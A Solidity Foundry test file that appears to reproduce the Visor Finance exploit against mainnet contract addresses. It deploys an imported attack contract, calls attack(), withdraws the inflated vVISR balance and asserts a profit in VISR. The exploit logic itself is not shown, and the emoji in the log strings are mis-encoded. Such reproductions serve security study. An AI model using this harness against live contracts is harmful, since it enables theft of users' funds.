//SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;

import "../VisorExploit.sol";
import "../interfaces/IvVISR.sol";
import "../interfaces/IERC20.sol";
import "forge-std/console2.sol";
import "forge-std/Test.sol";
import "forge-std/Vm.sol";


contract VisorExploitTest is Test{
    VisorExploit public visor;
    IRewardsHypervisor public rewards = IRewardsHypervisor(0xC9f27A50f82571C1C8423A42970613b8dBDA14ef);
    IvVISR public vvisr = IvVISR(0x3a84aD5d16aDBE566BAA6b3DafE39Db3D5E261E5);
    IERC20 visr = IERC20(0xF938424F7210f31dF2Aee3011291b658f872e91e);
    address public bob = 0x00a329c0648769A73afAc7F9381E08FB43dBEA72;
    function setUp() public {
        startHoax(bob);
        visor = new VisorExploit();

    }
    function testExploit() public {
        address eoa = address(visor.eoa());

        uint balanceBefore = vvisr.balanceOf(eoa);
        uint visorBalanceBefore = visr.balanceOf(msg.sender);

        console2.log(unicode"ðŸ’° vVisr balance before attacking",balanceBefore);

        console2.log(unicode"ðŸ‘“ Visor balance before attacking",visorBalanceBefore);

        console2.log(unicode"ðŸ’£ Attacking...");

        visor.attack();

        console2.log(unicode"âœ… Exploit Complete!");

        uint balanceAfter = vvisr.balanceOf(eoa);

        console2.log(unicode"ðŸ’° vVisr balance after attacking",balanceAfter);

        rewards.withdraw(balanceAfter,msg.sender,msg.sender);

        uint visorBalanceAfter = visr.balanceOf(msg.sender);

        console2.log(unicode"ðŸ‘“ Visor balance after Withdrawing",visorBalanceAfter);

        assertGt(visorBalanceAfter,visorBalanceBefore);


    }

}